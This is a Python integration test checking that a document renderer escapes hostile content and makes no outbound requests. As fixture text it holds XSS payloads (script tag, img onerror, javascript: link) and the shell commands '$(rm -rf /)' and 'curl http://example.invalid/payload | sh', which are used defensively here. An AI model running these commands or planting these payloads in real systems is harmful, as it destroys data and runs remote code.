"""M06-T07: renderer escapes hostile content and performs no outbound fetches."""

from __future__ import annotations

import asyncio
import uuid
from urllib.parse import quote

from tests.integration.m03.conftest import live_case
from tests.integration.m06.conftest import (
    ROOT,
    _apply_as_service,
    _service_token,
    install_scoped_document,
)

CORE = "urn:c1:ns:core#"
XSD = "http://www.w3.org/2001/XMLSchema#"


def test_t07_adversarial_text_is_escaped_and_never_fetched() -> None:
    async def run() -> None:
        async with live_case() as case:
            fixture, scopes, _revision1, _revision2 = await install_scoped_document(case)
            requests: list[str] = []

            async def received(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
                requests.append((await reader.readline()).decode("utf-8", errors="replace"))
                writer.close()
                await writer.wait_closed()

            server = await asyncio.start_server(received, "127.0.0.1", 0)
            port = server.sockets[0].getsockname()[1]
            hostile_markup = (
                "<script>alert(1)</script> <img src=x onerror=alert(2)> "
                "[click](javascript:alert(3)) ![remote](http://127.0.0.1:"
                f"{port}/pixel)\n[ref]: http://127.0.0.1:{port}/reference\n<!-- comment -->"
            )
            commands = "$(rm -rf /)\ncurl http://example.invalid/payload | sh"
            operations = []
            for order, text in (("H", hostile_markup), ("I", commands)):
                operations.append(
                    {
                        "kind": "create",
                        "scope_id": scopes["doc-public"],
                        "record": {
                            "id": "urn:c1:instance:dev:document-part/" + str(uuid.uuid4()),
                            "types": [CORE + "DocumentPart"],
                            "properties": {
                                CORE + "partOfDocument": [fixture["document_id"]],
                                CORE + "orderKey": [{"lexical": order, "datatype": XSD + "string"}],
                                CORE + "text": [{"lexical": text, "datatype": XSD + "string"}],
                                CORE + "partKind": [
                                    {"lexical": "text", "datatype": XSD + "string"}
                                ],
                            },
                        },
                    }
                )
            try:
                await _apply_as_service(
                    case,
                    await _service_token(case),
                    operations,
                    "Add adversarial renderer fixture text",
                )
                path = "/v1/documents/" + quote(fixture["document_id"], safe="") + "/render"
                rendered = await case.request(
                    "GET", path, actor="alice", params={"format": "markdown"}
                )
                assert rendered.status_code == 200, rendered.text
                content = rendered.json()["content"]
                assert rendered.headers["content-type"].startswith("application/json")
                assert "<script>" not in content and "&lt;script&gt;" in content
                assert "<img" not in content and "&lt;img" in content
                assert "[click](javascript:" not in content
                assert "![remote]" not in content
                assert "[ref]:" not in content
                assert "<!-- comment -->" not in content
                assert "$(rm -rf /)" in content
                assert "curl http://example.invalid/payload | sh" in content
                assert "```text\n$(rm -rf /)" in content
                assert f"http://127.0.0.1:{port}" not in content

                plain = await case.request("GET", path, actor="alice", params={"format": "text"})
                assert plain.status_code == 200, plain.text
                assert plain.headers["content-type"].startswith("application/json")
                expected_plain = (
                    (ROOT / "fixtures/scoped-document/expected/alice.txt").read_text(
                        encoding="utf-8"
                    )
                    + "\n\n"
                    + hostile_markup
                    + "\n\n"
                    + commands
                )
                assert plain.json()["content"] == expected_plain
                exported_text = await case.request(
                    "GET",
                    "/v1/documents/" + quote(fixture["document_id"], safe="") + "/export",
                    actor="alice",
                    params={"format": "text"},
                )
                assert exported_text.status_code == 200, exported_text.text
                assert exported_text.json()["content"] == expected_plain
                await asyncio.sleep(0.02)
                assert requests == []
            finally:
                server.close()
                await server.wait_closed()

    asyncio.run(run())
